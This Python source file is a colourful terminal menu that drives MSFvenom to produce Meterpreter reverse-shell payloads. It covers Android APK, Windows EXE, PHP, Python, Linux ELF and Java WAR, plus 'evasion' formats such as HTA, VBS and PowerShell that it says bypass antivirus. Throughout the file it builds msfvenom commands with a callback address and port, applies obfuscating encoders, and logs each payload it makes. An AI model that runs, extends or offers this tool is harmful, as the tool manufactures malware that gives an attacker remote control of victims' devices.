#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Exploit & Payload Generator TUI - MSFvenom Integration
=====================================================
Interactive TUI for exploit development and payload generation using MSFvenom.

Features:
- MSFvenom integration for payload generation
- APK, EXE, PHP, Python payloads
- Auto IP detection and manual IP input
- Auto port selection (4444) and manual port input
- Payload customization and encoding
- Cross-platform support

"""

import os
import sys
import time
import subprocess
import platform
import socket
import json
from typing import List, Dict, Optional
from rich.console import Console, RenderableType
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich.rule import Rule
from rich.box import ROUNDED, HEAVY, HEAVY_EDGE
from rich.theme import Theme
import readchar
import shutil 

# Theme
NEON_THEME = Theme({
    "neon.red": "bold #ff4d4d",
    "neon.green": "bold #35ff69",
    "neon.yellow": "bold #ffe500",
    "neon.cyan": "bold #00eaff",
    "neon.magenta": "bold #ff00f7",
    "accent": "bold #00ffc6",
    "hint": "#9ca3af",
})

console = Console(theme=NEON_THEME)

class ExploitGenerator:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.target_ip = ""
        self.port = 4444
        self.payload_type = ""
        self.payload_name = ""
        self.output_file = ""
        self.msfvenom_available = self.check_msfvenom()
        
        # Payload configurations
        self.payloads = {
            'apk': {
                'name': 'android/meterpreter/reverse_tcp',
                'ext': '.apk',
                'description': 'Android APK with Meterpreter reverse shell'
            },
            'exe': {
                'name': 'windows/meterpreter/reverse_tcp',
                'ext': '.exe',
                'description': 'Windows EXE with Meterpreter reverse shell'
            },
            'php': {
                'name': 'php/meterpreter/reverse_tcp',
                'ext': '.php',
                'description': 'PHP script with Meterpreter reverse shell'
            },
            'python': {
                'name': 'python/meterpreter/reverse_tcp',
                'ext': '.py',
                'description': 'Python script with Meterpreter reverse shell'
            },
            'elf': {
                'name': 'linux/x86/meterpreter/reverse_tcp',
                'ext': '',
                'description': 'Linux ELF binary with Meterpreter reverse shell'
            },
            'war': {
                'name': 'java/meterpreter/reverse_tcp',
                'ext': '.war',
                'description': 'Java WAR file with Meterpreter reverse shell'
            }
        }
        
        # Extra/Advanced payload configurations (less known but effective)
        self.extra_payloads = {
            'hta': {
                'name': 'windows/meterpreter/reverse_https',
                'ext': '.hta',
                'description': 'HTA (HTML Application) - Bypasses many AVs',
                'category': 'Evasion'
            },
            'vbs': {
                'name': 'windows/meterpreter/reverse_tcp',
                'ext': '.vbs',
                'description': 'VBScript - Stealth execution method',
                'category': 'Evasion'
            },
            'jsp': {
                'name': 'java/meterpreter/reverse_https',
                'ext': '.jsp',
                'description': 'JSP - Java Server Pages payload',
                'category': 'Web'
            },
            'asp': {
                'name': 'windows/meterpreter/reverse_tcp',
                'ext': '.asp',
                'description': 'ASP - Active Server Pages payload',
                'category': 'Web'
            },
            'dll': {
                'name': 'windows/meterpreter/reverse_tcp',
                'ext': '.dll',
                'description': 'DLL injection payload - Process hollowing',
                'category': 'Injection'
            },
            'so': {
                'name': 'linux/x64/meterpreter/reverse_tcp',
                'ext': '.so',
                'description': 'Shared Object - Linux library injection',
                'category': 'Injection'
            },
            'jar': {
                'name': 'java/meterpreter/reverse_https',
                'ext': '.jar',
                'description': 'JAR file - Java application payload',
                'category': 'Java'
            },
            'ps1': {
                'name': 'windows/meterpreter/reverse_tcp',
                'ext': '.ps1',
                'description': 'PowerShell script - Bypass execution policy',
                'category': 'Evasion'
            },
            'bat': {
                'name': 'cmd/windows/reverse_tcp',
                'ext': '.bat',
                'description': 'Batch file - Simple command execution',
                'category': 'Command'
            },
            'sh': {
                'name': 'cmd/unix/reverse_bash',
                'ext': '.sh',
                'description': 'Bash script - Unix command execution',
                'category': 'Command'
            },
            'pl': {
                'name': 'cmd/unix/reverse_perl',
                'ext': '.pl',
                'description': 'Perl script - Cross-platform execution',
                'category': 'Command'
            },
            'rb': {
                'name': 'cmd/unix/reverse_ruby',
                'ext': '.rb',
                'description': 'Ruby script - Alternative execution method',
                'category': 'Command'
            }
        }
        
        # Encoding options
        self.encoders = [
            'shikata_ga_nai',
            'x86/shikata_ga_nai',
            'x64/xor',
            'cmd/ifs',
            'php/base64',
            'generic/none'
        ]
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Connect to a remote address to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def check_msfvenom(self) -> bool:
        """Check if msfvenom is available with full paths"""
        paths = [
            '/usr/bin/msfvenom',        # Standard Kali path
            '/opt/metasploit-framework/bin/msfvenom'  # Possible alternative
        ]
        for path in paths:
            if os.path.exists(path):
                return True
            
    def log_payload(self, result: Dict):
        """Payload detaylarını log dosyasına kaydet"""
        log_file = "payload_log.txt"
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"""
            [ {timestamp} ]
            Payload Tipi: {self.payload_type.upper()}
            Payload Adı: {result.get('payload', 'Bilinmiyor')}
            Hedef IP (LHOST): {result.get('lhost', 'Bilinmiyor')}
            Port (LPORT): {result.get('lport', 'Bilinmiyor')}
            Encoder: {result.get('encoder', 'Yok')}
            Çıktı Dosyası: {result.get('file', 'Bilinmiyor')}
            Dosya Boyutu: {result.get('size', 0)} bytes
            Tam Dosya Yolu: {os.path.abspath(result.get('file', ''))}
            ----------------------------------------------
                """
        
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            console.print(f"[neon.green]Payload detayları '{log_file}' dosyasına kaydedildi[/neon.green]")
        except Exception as e:
            console.print(f"[neon.red]Log kaydı hatası: {e}[/neon.red]")

    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, 
                        output_name: str = "", encoder: str = "", is_extra: bool = False) -> Dict:
        """Generate payload using msfvenom"""
        if not self.msfvenom_available:
            return {"error": "MSFvenom not found. Please install Metasploit Framework."}
        
        # Check if it's an extra payload
        if is_extra:
            if payload_type not in self.extra_payloads:
                return {"error": f"Unknown extra payload type: {payload_type}"}
            payload_config = self.extra_payloads[payload_type]
        else:
            if payload_type not in self.payloads:
                return {"error": f"Unknown payload type: {payload_type}"}
            payload_config = self.payloads[payload_type]
        
        payload_name = payload_config['name']
        file_ext = payload_config['ext']
        
        # Set output filename
        if not output_name:
            output_name = f"payload_{payload_type}_{int(time.time())}{file_ext}"
        elif not output_name.endswith(file_ext):
            output_name += file_ext
        
        # Build msfvenom command
        cmd = [
            '/usr/bin/msfvenom' if os.path.exists('/usr/bin/msfvenom') 
            else '/opt/metasploit-framework/bin/msfvenom',
            '-p', payload_name,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-o', output_name
        ]
        
        # Add encoder if specified
        if encoder and encoder != 'generic/none':
            cmd.extend(['-e', encoder])
        
        # Add format-specific options
        if payload_type == 'apk':
            cmd.extend(['--platform', 'android', '--arch', 'dalvik'])
        elif payload_type == 'exe':
            cmd.extend(['--platform', 'windows', '--arch', 'x86'])
        elif payload_type == 'elf':
            cmd.extend(['--platform', 'linux', '--arch', 'x86'])
        elif payload_type == 'so':
            cmd.extend(['--platform', 'linux', '--arch', 'x64'])
        elif payload_type == 'dll':
            cmd.extend(['--platform', 'windows', '--arch', 'x86'])
        elif payload_type == 'hta':
            cmd.extend(['--platform', 'windows', '--arch', 'x86'])
        elif payload_type == 'vbs':
            cmd.extend(['--platform', 'windows', '--arch', 'x86'])
        elif payload_type == 'ps1':
            cmd.extend(['--platform', 'windows', '--arch', 'x86'])
        
        try:
            console.print(f"[neon.yellow]Generating {payload_type.upper()} payload...[/neon.yellow]")
            console.print(f"[neon.cyan]Command: {' '.join(cmd)}[/neon.cyan]")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                # Check if file was created
                if os.path.exists(output_name):
                    file_size = os.path.getsize(output_name)
                    self.log_payload({
                        "success": True,
                        "file": output_name,
                        "size": file_size,
                        "payload": payload_name,
                        "lhost": lhost,
                        "lport": lport,
                        "encoder": encoder if encoder else "none"
                    })
                    return {
                        "success": True,
                        "file": output_name,
                        "size": file_size,
                        "payload": payload_name,
                        "lhost": lhost,
                        "lport": lport,
                        "encoder": encoder if encoder else "none"
                    }
                else:
                    return {"error": "Payload generation failed - file not created"}
            else:
                return {"error": f"MSFvenom error: {result.stderr}"}
            
                
        except subprocess.TimeoutExpired:
            return {"error": "Payload generation timed out"}
        except Exception as e:
            return {"error": f"Error generating payload: {e}"}
        
    
    def list_payloads(self) -> List[Dict]:
        """List available payloads"""
        return [
            {
                'type': payload_type,
                'name': config['name'],
                'description': config['description'],
                'extension': config['ext']
            }
            for payload_type, config in self.payloads.items()
        ]
    
    def list_extra_payloads(self) -> List[Dict]:
        """List available extra payloads"""
        return [
            {
                'type': payload_type,
                'name': config['name'],
                'description': config['description'],
                'extension': config['ext'],
                'category': config['category']
            }
            for payload_type, config in self.extra_payloads.items()
        ]
    
    def list_encoders(self) -> List[str]:
        """List available encoders"""
        return self.encoders

def gradient_text(text: str, colors: List[str]) -> Text:
    t = Text()
    if not colors: return Text(text)
    if len(colors) == 1: return Text(text, style=colors[0])
    def lerp(a: int, b: int, t: float) -> int: return int(a + (b - a) * t)
    
    color_segments = len(colors) - 1
    segment_length = len(text) / color_segments if color_segments > 0 else len(text)
    
    for i, char in enumerate(text):
        segment = int(i / segment_length) if segment_length > 0 else 0
        if segment >= color_segments: segment = color_segments - 1
        progress = (i % segment_length) / segment_length if segment_length > 0 else 0
        c1, c2 = colors[segment], colors[segment+1]
        r1, g1, b1 = int(c1[1:3],16), int(c1[3:5],16), int(c1[5:7],16)
        r2, g2, b2 = int(c2[1:3],16), int(c2[3:5],16), int(c2[5:7],16)
        r, g, b = lerp(r1, r2, progress), lerp(g1, g2, progress), lerp(b1, b2, progress)
        t.append(char, style=f"bold #{r:02x}{g:02x}{b:02x}")
    return t

def create_layout(extra_expanded: bool = False) -> Layout:
    layout = Layout(name="root")
    layout.split(Layout(name="header", size=11), Layout(name="body", ratio=1))
    
    # Dynamic sidebar size based on extra menu expansion
    sidebar_size = 45 if extra_expanded else 30
    layout["body"].split_row(Layout(name="sidebar", size=sidebar_size), Layout(name="main", ratio=1))
    return layout

def create_header() -> Panel:
    banner = r"""
___________              .__         .__  __    
\_   _____/__  _________ |  |   ____ |__|/  |_  
 |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\ 
 |        \>    < |  |_> >  |_(  <_> )  ||  |   
/_______  /__/\_ \|   __/|____/\____/|__||__|   
        \/      \/|__| """
    
    title = gradient_text("EXPLOIT GENERATOR", ["#ff4d4d", "#ffe500"])
    
    # Satırları tek tek alıp ortala
    banner_lines = banner.strip("\n").splitlines()
    centered_banner = "\n".join(line.center(60) for line in banner_lines)  
    # 60 → panel genişliğine göre oynatabilirsin
    
    banner_text = Text(centered_banner, style="neon.red")
    
    quote = Text(
        "\nEvery vulnerability is a doorway waiting for the right key to be forged.",
        style="neon.red",
        justify="center"
    )
    
    header_content = Align.center(
        Text.assemble(banner_text, "\n", quote),
        vertical="middle"
    )
    
    return Panel(
        header_content,
        title=title,
        border_style="neon.red",
        box=HEAVY_EDGE,
    )


def create_sidebar(active_index: int, extra_expanded: bool = False, extra_selected: int = 0, extra_page: int = 1) -> Panel:
    options = [
        "Generate APK",
        "Generate EXE",
        "Generate PHP",
        "Generate Python",
        "Generate ELF",
        "Generate WAR",
        "Advanced Payloads",
        "List Payloads",
        "List Encoders",
        "Exit"
    ]
    
    lines = []
    for i, option in enumerate(options):
        if i == active_index:
            lines.append(Text(f" ➤ {option}", style="accent"))
            # Show extra payloads if EXTRA is selected and expanded
            if i == 6 and extra_expanded:  # EXTRA option
                lines.append(Text("", style="hint"))  # Empty line for spacing
                lines.append(Text("  ┌─ EXTRA PAYLOADS ─┐", style="neon.cyan"))
                
                # Page 1: Evasion & Web payloads
                if extra_page == 1:
                    extra_payloads = [
                        "  ├─ HTA (HTML Application)",
                        "  ├─ VBS (VBScript)",
                        "  ├─ JSP (Java Server Pages)",
                        "  ├─ ASP (Active Server Pages)",
                        "  ├─ PS1 (PowerShell)",
                        "  └─ BAT (Batch File)"
                    ]
                # Page 2: Injection & Command payloads
                else:
                    extra_payloads = [
                        "  ├─ DLL (Dynamic Link Library)",
                        "  ├─ SO (Shared Object)",
                        "  ├─ JAR (Java Archive)",
                        "  ├─ SH (Shell Script)",
                        "  ├─ PL (Perl Script)",
                        "  └─ RB (Ruby Script)"
                    ]
                
                for j, extra in enumerate(extra_payloads):
                    if j == extra_selected:
                        lines.append(Text(extra, style="accent"))
                    else:
                        lines.append(Text(extra, style="neon.yellow"))
                
                # Page navigation
                lines.append(Text("  └─────────────────┘", style="neon.cyan"))
                lines.append(Text(f"  Page {extra_page}/2 - Use A/D to change pages", style="neon.magenta"))
                lines.append(Text("", style="hint"))  # Empty line for spacing
        else:
            # Hide other options when EXTRA is expanded
            if not extra_expanded or i == 6:
                lines.append(Text(f"   {option}", style="hint"))
    
    body = Align.left(Text("\n").join(lines))
    return Panel(body, title="[neon.red]OPTIONS[/]", border_style="neon.red", box=HEAVY)

def create_main_content(generator: ExploitGenerator, content_type: str = "welcome", extra_page: int = 1) -> RenderableType:
    if content_type == "welcome":
        t = Text.assemble(
            ("Exploit & Payload Generator", "neon.red"), ("\n\n",),
            ("• MSFvenom integration for payload generation", "hint"), ("\n",),
            ("• APK, EXE, PHP, Python, ELF, WAR payloads", "hint"), ("\n",),
            ("• Auto IP detection and manual configuration", "hint"), ("\n",),
            ("• Payload encoding and customization", "hint"), ("\n",),
            ("• Cross-platform support", "hint"), ("\n\n",),
            ("MSFvenom Status: ", "hint"), 
            ("✓ Available" if generator.msfvenom_available else "✗ Not found", 
             "neon.green" if generator.msfvenom_available else "neon.red"), ("\n",),
            ("Local IP: ", "hint"), (generator.local_ip, "accent"), ("\n\n",),
            ("Select an option from the sidebar", "accent"), ("\n",),
            ("Use ↑/↓ to navigate, Enter to select", "hint")
        )
        return Panel(Align.center(t, vertical="middle"), title=gradient_text("WELCOME", ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)
    
    elif content_type == "payload_config":
        t = Text.assemble(
            ("Payload Configuration", "neon.yellow"), ("\n\n",),
            ("Payload Type: ", "hint"), (generator.payload_type.upper(), "accent"), ("\n",),
            ("Target IP (LHOST): ", "hint"), (generator.target_ip or "Auto", "accent"), ("\n",),
            ("Port (LPORT): ", "hint"), (str(generator.port), "accent"), ("\n",),
            ("Output File: ", "hint"), (generator.output_file or "Auto", "accent"), ("\n\n",),
            ("Press Enter to configure", "hint"), ("\n",),
            ("Press Q to go back", "hint")
        )
        return Panel(Align.center(t, vertical="middle"), title=gradient_text("CONFIG", ["#ffe500", "#ff4d4d"]), border_style="neon.yellow", box=HEAVY, expand=True)
    
    elif content_type == "payloads_list":
        payloads = generator.list_payloads()
        
        table = Table(box=ROUNDED)
        table.add_column("Type", style="neon.red", justify="center")
        table.add_column("Payload", style="neon.cyan")
        table.add_column("Description", style="neon.green")
        table.add_column("Extension", style="hint", justify="center")
        
        for payload in payloads:
            table.add_row(
                payload['type'].upper(),
                payload['name'],
                payload['description'],
                payload['extension'] or "none"
            )
        
        return Panel(table, title=gradient_text("AVAILABLE PAYLOADS", ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)
    
    elif content_type == "extra_payloads":
        # Filter payloads based on current page
        all_extra_payloads = generator.list_extra_payloads()
        
        # Page 1: Evasion & Web payloads
        if extra_page == 1:
            page_payloads = [p for p in all_extra_payloads if p['type'] in ['hta', 'vbs', 'jsp', 'asp', 'ps1', 'bat']]
            page_title = "EXTRA ADVANCED PAYLOADS - PAGE 1 (Evasion & Web)"
        # Page 2: Injection & Command payloads
        else:
            page_payloads = [p for p in all_extra_payloads if p['type'] in ['dll', 'so', 'jar', 'sh', 'pl', 'rb']]
            page_title = "EXTRA ADVANCED PAYLOADS - PAGE 2 (Injection & Command)"
        
        table = Table(box=ROUNDED)
        table.add_column("Type", style="neon.red", justify="center")
        table.add_column("Payload", style="neon.cyan")
        table.add_column("Description", style="neon.green")
        table.add_column("Category", style="neon.yellow", justify="center")
        table.add_column("Extension", style="hint", justify="center")
        
        for payload in page_payloads:
            table.add_row(
                payload['type'].upper(),
                payload['name'],
                payload['description'],
                payload['category'],
                payload['extension'] or "none"
            )
        
        return Panel(table, title=gradient_text(page_title, ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)
    
    elif content_type == "encoders_list":
        encoders = generator.list_encoders()
        
        table = Table(box=ROUNDED)
        table.add_column("Encoder", style="neon.cyan")
        table.add_column("Description", style="neon.green")
        
        encoder_descriptions = {
            'shikata_ga_nai': 'Polymorphic XOR additive feedback encoder',
            'x86/shikata_ga_nai': 'X86 Shikata Ga Nai encoder',
            'x64/xor': 'X64 XOR encoder',
            'cmd/ifs': 'Command IFS encoder',
            'php/base64': 'PHP Base64 encoder',
            'generic/none': 'No encoding'
        }
        
        for encoder in encoders:
            desc = encoder_descriptions.get(encoder, 'Unknown encoder')
            table.add_row(encoder, desc)
        
        return Panel(table, title=gradient_text("AVAILABLE ENCODERS", ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)
    
    elif content_type == "generation_result":
        if hasattr(generator, 'last_result') and generator.last_result:
            result = generator.last_result
            if result.get("success"):
                t = Text.assemble(
                    ("Payload Generated Successfully!", "neon.green"), ("\n\n",),
                    ("File: ", "hint"), (result["file"], "accent"), ("\n",),
                    ("Size: ", "hint"), (f"{result['size']} bytes", "accent"), ("\n",),
                    ("Payload: ", "hint"), (result["payload"], "accent"), ("\n",),
                    ("LHOST: ", "hint"), (result["lhost"], "accent"), ("\n",),
                    ("LPORT: ", "hint"), (str(result["lport"]), "accent"), ("\n",),
                    ("Encoder: ", "hint"), (result["encoder"], "accent"), ("\n\n",),
                    ("Press Enter to go back", "hint")
                )
                return Panel(Align.center(t, vertical="middle"), title=gradient_text("SUCCESS", ["#35ff69", "#ff4d4d"]), border_style="neon.green", box=HEAVY, expand=True)
            else:
                t = Text.assemble(
                    ("Payload Generation Failed", "neon.red"), ("\n\n",),
                    ("Error: ", "hint"), (result["error"], "accent"), ("\n\n",),
                    ("Press Enter to go back", "hint")
                )
                return Panel(Align.center(t, vertical="middle"), title=gradient_text("ERROR", ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)
        else:
            t = Text.assemble(
                ("No generation result available", "hint"), ("\n\n",),
                ("Press Enter to go back", "hint")
            )
            return Panel(Align.center(t, vertical="middle"), title=gradient_text("NO RESULT", ["#ff4d4d", "#ffe500"]), border_style="neon.red", box=HEAVY, expand=True)

def main():
    generator = ExploitGenerator()
    active_index = 0
    content_type = "welcome"
    extra_expanded = False
    extra_selected = 0  # Track which extra payload is selected
    extra_page = 1  # Track which page we're on (1 or 2)
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        
        layout = create_layout(extra_expanded)
        
        # Header
        layout["header"].update(create_header())
        
        # Sidebar
        layout["sidebar"].update(create_sidebar(active_index, extra_expanded, extra_selected, extra_page))
        
        # Main content
        layout["main"].update(create_main_content(generator, content_type, extra_page))
        
        console.print(layout)
        
        try:
            key = readchar.readkey()
            
            if key == readchar.key.UP:
                active_index = (active_index - 1) % 10
                extra_expanded = False  # Close extra menu when moving
            elif key == readchar.key.DOWN:
                active_index = (active_index + 1) % 10
                extra_expanded = False  # Close extra menu when moving
            elif key == readchar.key.LEFT:
                if active_index == 6 and extra_expanded:  # EXTRA is selected and expanded
                    if extra_page == 1:
                        extra_selected = (extra_selected - 1) % 6  # 6 payloads per page
                    else:
                        extra_selected = (extra_selected - 1) % 6  # 6 payloads per page
            elif key == readchar.key.RIGHT:
                if active_index == 6 and extra_expanded:  # EXTRA is selected and expanded
                    if extra_page == 1:
                        extra_selected = (extra_selected + 1) % 6  # 6 payloads per page
                    else:
                        extra_selected = (extra_selected + 1) % 6  # 6 payloads per page
            elif key == 'a' or key == 'A':  # Page navigation
                if active_index == 6 and extra_expanded:
                    if extra_page == 1:
                        extra_page = 2
                    else:
                        extra_page = 1
                    extra_selected = 0  # Reset selection when changing pages
            elif key == 'd' or key == 'D':  # Page navigation
                if active_index == 6 and extra_expanded:
                    if extra_page == 1:
                        extra_page = 2
                    else:
                        extra_page = 1
                    extra_selected = 0  # Reset selection when changing pages
            elif key == readchar.key.ENTER:
                if active_index in [0, 1, 2, 3, 4, 5]:  # Payload generation
                    payload_types = ['apk', 'exe', 'php', 'python', 'elf', 'war']
                    generator.payload_type = payload_types[active_index]
                    
                    content_type = "payload_config"
                    while True:
                        os.system('cls' if os.name == 'nt' else 'clear')
                        layout = create_layout(extra_expanded)
                        layout["header"].update(create_header())
                        layout["sidebar"].update(create_sidebar(active_index, extra_expanded, extra_selected, extra_page))
                        layout["main"].update(create_main_content(generator, content_type, extra_page))
                        console.print(layout)
                        
                        # Configure payload
                        console.print(f"\n[neon.yellow]Configuring {generator.payload_type.upper()} payload...[/neon.yellow]")
                        
                        # IP configuration
                        ip_choice = input(f"Use auto IP ({generator.local_ip})? (y/n) [y]: ").strip().lower()
                        if ip_choice == 'n':
                            generator.target_ip = input("Enter target IP (LHOST): ").strip()
                        else:
                            generator.target_ip = generator.local_ip
                        
                        # Port configuration
                        port_choice = input(f"Use auto port (4444)? (y/n) [y]: ").strip().lower()
                        if port_choice == 'n':
                            port_input = input("Enter port (LPORT): ").strip()
                            try:
                                generator.port = int(port_input)
                            except ValueError:
                                generator.port = 4444
                        else:
                            generator.port = 4444
                        
                        # Output filename
                        output_choice = input("Use auto filename? (y/n) [y]: ").strip().lower()
                        if output_choice == 'n':
                            generator.output_file = input("Enter output filename: ").strip()
                        else:
                            generator.output_file = ""
                        
                        # Encoder selection
                        console.print(f"\n[neon.cyan]Available encoders: {', '.join(generator.encoders)}[/neon.cyan]")
                        encoder_choice = input("Enter encoder (or press Enter for none): ").strip()
                        if encoder_choice and encoder_choice in generator.encoders:
                            encoder = encoder_choice
                        else:
                            encoder = ""
                        
                        # Generate payload
                        console.print(f"\n[neon.yellow]Generating {generator.payload_type.upper()} payload...[/neon.yellow]")
                        result = generator.generate_payload(
                            generator.payload_type,
                            generator.target_ip,
                            generator.port,
                            generator.output_file,
                            encoder
                        )
                        
                        generator.last_result = result
                        content_type = "generation_result"
                        break
                
                elif active_index == 6:  # EXTRA - Advanced Payloads
                    if extra_expanded:
                        # Generate the selected extra payload based on page
                        if extra_page == 1:
                            extra_payload_types = ['hta', 'vbs', 'jsp', 'asp', 'ps1', 'bat']
                        else:
                            extra_payload_types = ['dll', 'so', 'jar', 'sh', 'pl', 'rb']
                        selected_payload_type = extra_payload_types[extra_selected]
                        generator.payload_type = selected_payload_type
                        
                        # Configure extra payload
                        console.print(f"\n[neon.yellow]Configuring {generator.payload_type.upper()} payload...[/neon.yellow]")
                        
                        # IP configuration
                        ip_choice = input(f"Use auto IP ({generator.local_ip})? (y/n) [y]: ").strip().lower()
                        if ip_choice == 'n':
                            generator.target_ip = input("Enter target IP (LHOST): ").strip()
                        else:
                            generator.target_ip = generator.local_ip
                        
                        # Port configuration
                        port_choice = input(f"Use auto port (4444)? (y/n) [y]: ").strip().lower()
                        if port_choice == 'n':
                            port_input = input("Enter port (LPORT): ").strip()
                            try:
                                generator.port = int(port_input)
                            except ValueError:
                                generator.port = 4444
                        else:
                            generator.port = 4444
                        
                        # Output filename
                        output_choice = input("Use auto filename? (y/n) [y]: ").strip().lower()
                        if output_choice == 'n':
                            generator.output_file = input("Enter output filename: ").strip()
                        else:
                            generator.output_file = ""
                        
                        # Encoder selection
                        console.print(f"\n[neon.cyan]Available encoders: {', '.join(generator.encoders)}[/neon.cyan]")
                        encoder_choice = input("Enter encoder (or press Enter for none): ").strip()
                        if encoder_choice and encoder_choice in generator.encoders:
                            encoder = encoder_choice
                        else:
                            encoder = ""
                        
                        # Generate payload
                        console.print(f"\n[neon.yellow]Generating {generator.payload_type.upper()} payload...[/neon.yellow]")
                        result = generator.generate_payload(
                            generator.payload_type,
                            generator.target_ip,
                            generator.port,
                            generator.output_file,
                            encoder,
                            is_extra=True
                        )
                        
                        generator.last_result = result
                        content_type = "generation_result"
                        extra_expanded = False  # Close extra menu after generation
                    else:
                        # Toggle extra menu expansion
                        extra_expanded = True
                        content_type = "extra_payloads"
                
                elif active_index == 7:  # List Payloads
                    content_type = "payloads_list"
                
                elif active_index == 8:  # List Encoders
                    content_type = "encoders_list"
                
                elif active_index == 9:  # Exit
                    break
            
            elif key.lower() == 'q':
                if content_type != "welcome":
                    content_type = "welcome"
                else:
                    break
                    
        except KeyboardInterrupt:
            break
        except EOFError:
            break

    console.print("[neon.green]Goodbye![/neon.green]")

if __name__ == "__main__":
    main()
